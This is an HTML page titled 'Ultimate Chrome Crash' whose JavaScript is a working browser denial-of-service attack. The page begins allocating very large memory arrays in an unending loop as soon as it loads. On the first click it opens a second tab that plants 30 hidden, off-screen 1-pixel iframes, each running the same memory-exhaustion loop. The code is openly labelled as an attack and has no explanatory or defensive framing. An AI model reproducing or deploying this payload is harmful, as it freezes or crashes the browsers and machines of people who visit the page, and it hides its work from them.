<!DOCTYPE html>
<html>
<head>
    <title>Click to Start - Ultimate Chrome Crash</title>
</head>
<body>
    <h1>Click Anywhere to Start</h1>
    <p>This page will open a second tab that runs a more aggressive attack.</p>

    <script>
        function startWorker() {
            let data = [];
            function allocate() {
                for (let i = 0; i < 1000; i++) { 
                    data.push(new Float64Array(2e7)); // Large memory allocations
                }
                requestAnimationFrame(allocate);
            }
            allocate();
        }

        function openAttackTab() {
            let attackTab = window.open("", "_blank"); // Open second attack tab
            if (!attackTab) {
                alert("Popup blocked! Please allow popups and try again.");
                return;
            }

            // Inject HTML with properly formatted script into the new tab
            attackTab.document.write(`
                <html>
                <head><title>iFrame Attack</title></head>
                <body>
                <h1>Hidden iFrames Running...</h1>
                <script>
                    function createIframe() {
                        let iframe = document.createElement("iframe");
                        iframe.style.width = "1px";
                        iframe.style.height = "1px";
                        iframe.style.position = "absolute";
                        iframe.style.left = "-9999px";
                        document.body.appendChild(iframe);
                        
                        // Write attack script inside the iframe
                        let iframeDoc = iframe.contentWindow.document;
                        iframeDoc.open();
                        iframeDoc.write('<html><head><title>Attack</title></head><body>');
                        iframeDoc.write('<script>');
                        iframeDoc.write('function startWorker() { let data = []; function allocate() { for (let i = 0; i < 500; i++) { data.push(new Float64Array(2e7)); } requestAnimationFrame(allocate); } allocate(); } startWorker();');
                        iframeDoc.write('<\/script>');
                        iframeDoc.write('</body></html>');
                        iframeDoc.close();
                    }

                    function launchIframes() {
                        for (let i = 0; i < 30; i++) { // Increase iframe count
                            setTimeout(createIframe, i * 10);
                        }
                    }

                    launchIframes();
                <\/script>
                </body>
                </html>
            `);
            attackTab.document.close();
        }

        document.body.addEventListener("click", openAttackTab, { once: true });

        // Start the initial memory exhaustion in the first tab
        startWorker();
    </script>
</body>
</html>
